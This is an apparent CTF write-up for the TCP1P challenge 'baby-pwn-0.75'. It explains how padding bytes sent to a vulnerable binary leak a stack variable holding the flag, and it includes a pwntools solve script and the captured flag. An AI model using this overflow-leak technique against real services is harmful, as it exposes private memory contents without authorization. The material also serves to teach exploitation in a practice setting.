# baby-pwn-0.75 
> Write-up author: vreshco
## DESCRIPTION:
Apakah kamu tau bahwa Buffer Overflow dapat me leak suatu nilai variable?

Koneksikan menggunakan:

nc ctf.tcp1p.com 3830


## HINT:
- NONE
## STEPS:
1. First, download the binary file given, then check the binary type.

> RESULT - ELF 64 BIT and luckily not stripped

![image](https://user-images.githubusercontent.com/70703371/215320723-53d8e24b-5d2e-4952-bacf-e2978977c49c.png)


2. Now check the binary's protection.

> RESULT - PARTIAL RELRO

![image](https://user-images.githubusercontent.com/70703371/215320758-130a6c5b-323e-4a01-bc8e-83d0dc70af42.png)


3. Hmm.. Let's make the binary executeably then execute it.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/215320818-90df9081-bee9-4bfc-9db5-ff25f3bd9395.png)


4. Let's decompile the binary then.
5. Analyzing the `vuln()` function, we know that there's a vulnerability about leaking variable value by utilizing the `%s`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/215693733-ac00bffc-08b4-4dfa-8f4b-46ae1e8abeff.png)


![image](https://user-images.githubusercontent.com/70703371/215693958-97eeaa23-15b1-43ad-940f-f68f8798f303.png)


6. We can leak the `local_98` value. Notice since there's no specific payload we need to send, we just need add padding bytes and leak it one by one.
7. Let's start by sending 32 bytes.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/215696243-914c0857-d92f-49f7-852e-f1e4eceebc95.png)


8. Looks like we leaked the flag but not only half of it.
9. So i bruteforced it by incrementing the bytes by 2-4 and so on.

> 52 bytes.

![image](https://user-images.githubusercontent.com/70703371/215698166-705fa72d-84ab-4e86-b6a8-d7fc0c981a47.png)


> 76 bytes.

![image](https://user-images.githubusercontent.com/70703371/215697094-45911f53-0970-492c-987e-5d77864a7b16.png)


10. But when i input certain bytes like **53** and **75** got no char leaked.

> 53

![image](https://user-images.githubusercontent.com/70703371/215702213-e11797be-c08a-4cb1-9886-41c2575fdc16.png)


> 75

![image](https://user-images.githubusercontent.com/70703371/215702315-914ed292-6646-4f46-b24f-f68f0307e300.png)


11. When i tried to read the `flag()` function, notice if a char is `_` hence shall printed null bytes, which means the null bytes is an underscore.

![image](https://user-images.githubusercontent.com/70703371/215702960-a824fa57-430f-439f-b295-e26f3fabd007.png)


13. We got the flag!

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)


exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
sh = start()
'''
for i in range(32, 101):
    try:
        sh = start()
        bytess = '{}'.format(i)
        pay = b'A' * int(bytess)
        sh.sendlineafter('?',pay)
        get = sh.recvline()
        print(get)
    except EOFError:
        pass
'''
#32, 53, 54, 75, 76
pay = flat([
    b'A' * 76
])
sh.sendlineafter('?', pay)
sh.interactive()
```

## FLAG

```
TCP1P{buffer-overflow_to-leak-some-variable_6967462384}
```

